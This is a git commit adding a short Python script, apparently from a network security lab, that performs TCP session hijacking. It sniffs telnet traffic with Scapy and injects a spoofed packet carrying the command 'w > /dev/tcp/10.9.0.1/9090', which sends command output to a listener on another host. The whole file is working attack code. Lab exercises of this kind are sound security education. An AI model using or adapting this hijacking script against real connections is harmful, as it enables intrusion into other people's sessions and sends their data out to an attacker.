460aa7caf57b372f5404a609c652864e307f074c
Ifeanyichukwu Ukadike <58455326+iukadike@users.noreply.github.com>
2023-06-20 21:06:19 +0100

    create tcp_session_highjack.py
    - initial commit

---
+++ tcp-attack-lab/tcp_session_highjack.py
@@ -0,0 +1,17 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+def send_cmd(pkt):
+    if not pkt[IP][TCP].payload:
+        newpkt = IP() / TCP() / Raw(load = '\rw > /dev/tcp/10.9.0.1/9090\r')
+        newpkt[IP].src = pkt[IP].src
+        newpkt[IP].dst = pkt[IP].dst
+        newpkt[TCP].sport = pkt[TCP].sport
+        newpkt[TCP].dport = pkt[TCP].dport        
+        newpkt[TCP].flags = 'PA'
+        newpkt[TCP].seq = pkt[TCP].seq
+        newpkt[TCP].ack = pkt[TCP].ack
+        send(newpkt, verbose=0)
+        print('injected payload...')
+    
+sniff(iface = 'br-fee11e059dc7', filter = 'tcp dst port 23 && (not ether host 02:42:e4:2c:cc:83)', prn = send_cmd)
